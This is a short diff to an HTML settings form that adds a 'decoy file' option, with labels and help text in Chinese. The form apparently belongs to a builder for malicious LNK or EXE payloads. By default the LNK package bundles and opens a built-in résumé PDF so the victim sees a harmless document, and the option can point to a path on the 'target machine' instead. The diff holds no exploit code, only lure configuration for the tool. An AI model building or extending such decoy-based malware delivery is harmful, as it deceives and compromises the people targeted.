@@ -186,6 +186,13 @@
                     <span class="help">仅在启用弹窗时生效。</span>
                 </div>
 
+                <div class="form-group">
+                    <label for="decoy_file">运行后打开文件（可选）</label>
+                    <input id="decoy_file" class="mono" type="text" name="decoy_file" value="{{ config.decoy_file }}"
+                           placeholder="留空：LNK 自动打包内置 PDF；EXE 不打开" maxlength="260" autocomplete="off">
+                    <span class="help">留空时 LNK 包会自动带上并打开内置的 <code>李泽宇简历.pdf</code>；独立 EXE 暂不内置，可填目标机绝对路径覆盖。后续支持上传文件。</span>
+                </div>
+
                 <div class="form-actions">
                     <button type="submit" class="btn btn-primary">保存行为设置</button>
                 </div>
